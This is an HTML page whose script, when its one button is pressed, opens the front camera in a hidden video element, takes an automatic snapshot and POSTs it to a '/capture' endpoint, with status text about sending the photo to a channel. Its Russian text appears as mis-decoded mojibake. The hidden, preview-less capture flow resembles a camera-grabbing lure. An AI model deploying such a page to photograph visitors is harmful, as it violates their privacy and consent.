<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–§–æ—Ç–æ –≤ –∫–∞–Ω–∞–ª</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            width: 100%;
            margin: 10px 0;
        }
        .btn:active {
            background: #006699;
            transform: scale(0.98);
        }
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            min-height: 40px;
        }
        .success {
            background: #d4edda;
            color: #155724;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
        }
        .hidden {
            display: none;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>üì∏ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ –≤ –∫–∞–Ω–∞–ª</h2>
        
        <video id="video" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" class="hidden"></canvas>
        
        <button id="startBtn" class="btn">üöÄ –ù–∞—á–∞—Ç—å</button>
        
        <div id="status"></div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const statusDiv = document.getElementById('status');
        
        let stream = null;

        startBtn.addEventListener('click', async () => {
            try {
                startBtn.disabled = true;
                statusDiv.textContent = 'üì∑ –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –∫–∞–º–µ—Ä—É...';
                
                // –í–∫–ª—é—á–∞–µ–º –∫–∞–º–µ—Ä—É
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 640, 
                        height: 480,
                        facingMode: 'user'
                    } 
                });
                
                video.srcObject = stream;
                
                // –ñ–¥–µ–º –∫–æ–≥–¥–∞ –≤–∏–¥–µ–æ –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è
                await new Promise((resolve) => {
                    video.onplaying = resolve;
                });
                
                statusDiv.textContent = 'üì∏ –î–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...';
                
                // –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ base64
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                
                statusDiv.textContent = 'üì§ –û—Ç–ø—Ä–∞–≤–ª—è—é...';
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ photo: photo })
                });
                
                if (response.ok) {
                    statusDiv.textContent = '‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –∫–∞–Ω–∞–ª!';
                    statusDiv.className = 'success';
                    
                    // –ó–∞–∫—Ä—ã–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                    
                    // –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        startBtn.disabled = false;
                        statusDiv.textContent = '';
                        statusDiv.className = '';
                    }, 2000);
                } else {
                    throw new Error('–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞');
                }
                
            } catch (err) {
                console.error(err);
                statusDiv.textContent = '‚ùå –û—à–∏–±–∫–∞: ' + (err.message || '–Ω–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ');
                statusDiv.className = 'error';
                
                startBtn.disabled = false;
                
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }
        });
    </script>
</body>
</html>
